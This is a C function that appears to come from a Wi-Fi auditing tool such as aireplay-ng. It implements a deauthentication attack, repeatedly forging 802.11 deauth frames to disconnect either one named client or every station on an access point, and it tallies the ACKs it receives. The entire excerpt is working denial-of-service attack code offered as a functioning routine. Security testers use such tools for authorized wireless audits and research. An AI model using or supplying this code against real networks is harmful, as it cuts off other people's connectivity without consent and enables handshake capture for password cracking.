int do_attack_deauth( void )
{
    int i, n;
    int aacks, sacks, caplen;
    struct timeval tv;
    fd_set rfds;

    if(getnet(NULL, 0, 1) != 0)
        return 1;

    if( memcmp( opt.r_dmac, NULL_MAC, 6 ) == 0 )
        printf( "NB: this attack is more effective when targeting\n"
                "a connected wireless client (-c <client's mac>).\n" );

    n = 0;

    while( 1 )
    {
        if( opt.a_count > 0 && ++n > opt.a_count )
            break;

        usleep( 180000 );

        if( memcmp( opt.r_dmac, NULL_MAC, 6 ) != 0 )
        {
            /* deauthenticate the target */

            memcpy( h80211, DEAUTH_REQ, 26 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            aacks = 0;
            sacks = 0;
            for( i = 0; i < 64; i++ )
            {
                if(i == 0)
                {
                    PCT; printf( "Sending 64 directed DeAuth. STMAC:"
                                " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
                                opt.r_dmac[0],  opt.r_dmac[1],
                                opt.r_dmac[2],  opt.r_dmac[3],
                                opt.r_dmac[4],  opt.r_dmac[5],
                                sacks, aacks );
                }

                memcpy( h80211 +  4, opt.r_dmac,  6 );
                memcpy( h80211 + 10, opt.r_bssid, 6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );

                memcpy( h80211 +  4, opt.r_bssid, 6 );
                memcpy( h80211 + 10, opt.r_dmac,  6 );

                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );

                while( 1 )
                {
                    FD_ZERO( &rfds );
                    FD_SET( dev.fd_in, &rfds );

                    tv.tv_sec  = 0;
                    tv.tv_usec = 1000;

                    if( select( dev.fd_in + 1, &rfds, NULL, NULL, &tv ) < 0 )
                    {
                        if( errno == EINTR ) continue;
                        perror( "select failed" );
                        return( 1 );
                    }

                    if( ! FD_ISSET( dev.fd_in, &rfds ) )
                        break;

                    caplen = read_packet( tmpbuf, sizeof( tmpbuf ), NULL );

                    if(caplen <= 0 ) break;
                    if(caplen != 10) continue;
                    if( tmpbuf[0] == 0xD4)
                    {
                        if( memcmp(tmpbuf+4, opt.r_dmac, 6) == 0 )
                        {
                            aacks++;
                        }
                        if( memcmp(tmpbuf+4, opt.r_bssid, 6) == 0 )
                        {
                            sacks++;
                        }
                        PCT; printf( "Sending 64 directed DeAuth. STMAC:"
                                    " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
                                    opt.r_dmac[0],  opt.r_dmac[1],
                                    opt.r_dmac[2],  opt.r_dmac[3],
                                    opt.r_dmac[4],  opt.r_dmac[5],
                                    sacks, aacks );
                    }
                }
            }
            printf("\n");
        }
        else
        {
            /* deauthenticate all stations */

            PCT; printf( "Sending DeAuth to broadcast -- BSSID:"
                         " [%02X:%02X:%02X:%02X:%02X:%02X]\n",
                         opt.r_bssid[0], opt.r_bssid[1],
                         opt.r_bssid[2], opt.r_bssid[3],
                         opt.r_bssid[4], opt.r_bssid[5] );

            memcpy( h80211, DEAUTH_REQ, 26 );

            memcpy( h80211 +  4, BROADCAST,   6 );
            memcpy( h80211 + 10, opt.r_bssid, 6 );
            memcpy( h80211 + 16, opt.r_bssid, 6 );

            for( i = 0; i < 128; i++ )
            {
                if( send_packet( h80211, 26 ) < 0 )
                    return( 1 );

                usleep( 2000 );
            }
        }
    }

    return( 0 );
}